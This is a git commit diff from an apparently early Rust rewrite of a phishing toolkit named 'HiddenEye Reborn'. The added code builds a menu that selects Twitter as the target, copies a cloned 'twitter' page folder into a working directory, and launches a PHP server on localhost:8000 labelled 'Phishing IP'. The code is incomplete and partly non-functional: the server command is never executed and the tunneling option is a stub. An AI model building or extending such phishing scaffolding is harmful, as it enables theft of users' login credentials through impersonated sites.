2fdbd0c6120c4a9076c0255f16c6edf356f7aa66
DarkMidus <39868305+darkmidus@users.noreply.github.com>
2022-05-08 02:20:12 +0000

    Progress right?

--- src/main_runner.rs
+++ src/main_runner.rs
@@ -1,14 +1,60 @@
 use colored::Colorize;
+use std::process::Command;
 #[path = "extra.rs"] mod extra;
 
+pub fn results_page() {
+  print!("\x1B[2J\x1B[1;1H");
+  println!("{}", "HiddenEye Reborn".red());
+  println!("{}", "-----------------------".blue());
+  println!("{}{}", "Phishing IP: ".red(), "localhost:8000".blue());
+  println!("");
+    loop {};
+}
+
+pub fn localhost_setup() {
+  Command::new("cp")
+    .arg("-r")
+    .arg("src/pages/twitter")
+    .arg("src/workingFolder")
+    .output();
+  Command::new("php")
+    .arg("-S")
+    .arg("localhost:8000");
+}
+
+pub fn start_tunneling(x: i32) {
+  if x == 1 {
+    localhost_setup();
+    results_page();
+  }
+}
+
+pub fn tunneling_options() {
+  print!("\x1B[2J\x1B[1;1H");
+  println!("{}", "HiddenEye Reborn".red());
+  println!("{}", "-----------------------".blue());
+  println!("{}{}{}{}", "{".red(), "1".blue(), "}".red(), " LocalHost".blue());
+  println!("{}{}{}{}", "{".red(), "2".blue(), "}".red(), " LocalTunnel".blue());
+  println!();
+  print!("{}", "Which tunneling option? ".red());
+  let mut answer = extra::hidden_input();
+  if answer == "1" {
+    start_tunneling(1);
+  }
+  else if answer == "2" {
+    println!("You chose LocalTunnel");
+  }
+}
 
 pub fn start_main_menu() {
+  print!("\x1B[2J\x1B[1;1H");
   println!("{}", "HiddenEye Reborn".red());
   println!("{}", "-----------------------".blue());
   println!("{}{}{}{}", "{".red(), "1".blue(), "}".red(), " Twitter".blue());
   println!();
-  println!("{}", "Which site? ".red());
+  print!("{}", "Which site? ".red());
   let mut answer = extra::hidden_input();
-  println!("{}", answer)
-  
+  if answer == "1" {
+    tunneling_options()
+  }
 }
